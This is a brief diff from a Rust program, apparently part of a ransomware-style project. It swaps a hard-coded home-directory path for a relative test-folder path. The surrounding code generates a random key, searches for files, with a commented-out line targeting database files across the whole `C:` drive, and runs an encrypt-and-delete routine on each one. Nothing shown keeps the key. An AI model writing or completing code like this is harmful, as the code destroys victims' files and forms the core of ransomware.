@@ -17,7 +17,7 @@ fn main() {
     let key: [u8; 32] = thread_rng().gen();
 
     //let paths = search_db_files("C:\\");
-    let paths = search_txt_files("/home/sighgone/projects/sudle/test_files");
+    let paths = search_txt_files("~/projects/sudle/test_files");
     for file_path in paths {
         let output_file_path = format!("{}_encrypted", file_path);
         match encrypt_delete(&file_path, &output_file_path, &key) {
